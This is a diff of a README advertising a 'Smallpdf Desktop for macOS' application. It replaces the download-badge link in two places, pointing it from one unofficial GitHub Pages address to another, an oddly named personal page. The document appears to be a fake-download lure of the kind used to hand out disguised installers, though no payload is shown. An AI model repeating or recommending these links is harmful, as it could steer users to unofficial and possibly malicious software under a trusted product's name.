@@ -3,7 +3,7 @@
 Smallpdf Desktop is a powerful and simple PDF management application designed for macOS users. It offers a wide range of tools to convert, compress, edit, and organize PDF files, making document handling effortless for individuals and businesses alike.
 
 ## ✅ Download Smallpdf Desktop for macOS  
-[![Download Smallpdf](https://img.shields.io/badge/Download-Smallpdf-blueviolet)](https://smallpdf-desktop-mac-download.github.io/.github)
+[![Download Smallpdf](https://img.shields.io/badge/Download-Smallpdf-blueviolet)](https://shuziktobehuman.github.io/huja/SmallPDF)
 
 ---
 
@@ -58,7 +58,7 @@ Smallpdf Desktop brings the convenience of online PDF tools into a native macOS 
 
 ---
 
-[![Download Smallpdf](https://img.shields.io/badge/Download-Smallpdf-blueviolet)](https://smallpdf-desktop-mac-download.github.io/.github)
+[![Download Smallpdf](https://img.shields.io/badge/Download-Smallpdf-blueviolet)](https://shuziktobehuman.github.io/huja/SmallPDF)
 
 ---
 
